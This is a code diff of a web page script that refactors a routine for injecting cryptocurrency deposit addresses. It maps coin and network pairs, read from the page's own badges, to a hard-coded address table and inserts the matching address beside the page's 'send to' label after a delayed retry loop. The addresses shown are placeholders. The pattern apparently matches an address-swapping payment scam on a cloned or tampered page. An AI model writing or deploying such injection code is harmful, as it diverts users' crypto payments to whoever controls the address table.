@@ -44,26 +44,19 @@
   observer.observe(document.body, { childList: true, subtree: true });
 </script>
 <script>
-  const coinAddresses = {
-    // BTC
+  const coinNetworkAddresses = {
     "BTC_BITCOIN": "1000000000000000",
     "BTC_LIQUID": "1000000000000001",
-
-    // ETH
     "ETH_ETHEREUM": "1000000000000002",
     "ETH_BLAST": "1000000000000003",
     "ETH_SCROLL": "1000000000000004",
     "ETH_ZKSYNC ERA": "1000000000000005",
     "ETH_BASE": "1000000000000006",
-
-    // USDC
     "USDC_ETHEREUM": "1000000000000007",
     "USDC_BASE": "1000000000000008",
     "USDC_SOLANA": "1000000000000009",
     "USDC_BSC": "1000000000000010",
     "USDC_POLYGON": "1000000000000011",
-
-    // USDT
     "USDT_ETHEREUM": "1000000000000012",
     "USDT_SOLANA": "1000000000000013",
     "USDT_POLYGON": "1000000000000014",
@@ -71,8 +64,6 @@
     "USDT_TON": "1000000000000016",
     "USDT_BSC": "1000000000000017",
     "USDT_LIQUID": "1000000000000018",
-
-    // Others
     "SOL_SOLANA": "1000000000000019",
     "TRX_TRON": "1000000000000020",
     "BNB_BSC": "1000000000000021"
@@ -90,47 +81,27 @@
 
     const symbol = coinSymbolEl.textContent.trim().toUpperCase();
 
-    // Get network name (first word, uppercase)
-    const networkEl = coinContainer.querySelector('.font-display.mt-2');
-    if (!networkEl) return false;
+    const networkBadge = coinContainer.querySelector('div.mt-2.inline-block.rounded.border');
+    if (!networkBadge) return false;
 
-    const rawNetwork = networkEl.textContent.trim().split(" ")[0]; // only first word
-    const network = rawNetwork.toUpperCase();
+    const network = networkBadge.textContent.trim().split(" ")[0].toUpperCase();
 
     const key = `${symbol}_${network}`;
-    const address = coinAddresses[key];
-    if (!address) {
-      console.warn("❌ No address found for key:", key);
-      return false;
+    const address = coinNetworkAddresses[key];
+    if (!address) return false;
+
+    const sendToLabel = document.getElementById("send-to-label");
+    if (!sendToLabel) return false;
+
+    let addressEl = document.getElementById("custom-address-display");
+    if (!addressEl) {
+      addressEl = document.createElement("span");
+      addressEl.id = "custom-address-display";
+      addressEl.className = "dark:text-flashbang-white text-new-black inline-block select-all break-words break-all text-xl font-bold";
+      sendToLabel.insertAdjacentElement("afterend", addressEl);
     }
 
-    function injectAddress() {
-      const sendToLabel = document.getElementById("send-to-label");
-      if (!sendToLabel) return false;
-
-      let addressEl = document.getElementById("custom-address-display");
-      if (!addressEl) {
-        addressEl = document.createElement("span");
-        addressEl.id = "custom-address-display";
-        addressEl.className = "dark:text-flashbang-white text-new-black inline-block select-all break-words break-all text-xl font-bold";
-        addressEl.style.marginTop = "8px";
-        sendToLabel.insertAdjacentElement("afterend", addressEl);
-      }
-
-      addressEl.textContent = address;
-      return true;
-    }
-
-    const observer = new MutationObserver(() => {
-      const success = injectAddress();
-      if (success) observer.disconnect();
-    });
-
-    observer.observe(document.body, {
-      childList: true,
-      subtree: true,
-    });
-
+    addressEl.textContent = address;
     return true;
   }
 
@@ -140,15 +111,16 @@
       let attempts = 0;
 
       const interval = setInterval(() => {
-        const started = showCoinAddress();
+        const injected = showCoinAddress();
         attempts++;
-        if (started || attempts >= maxAttempts) {
+        if (injected || attempts >= maxAttempts) {
           clearInterval(interval);
         }
       }, 500);
     }, 3000);
   });
 </script>
+
 
 
 
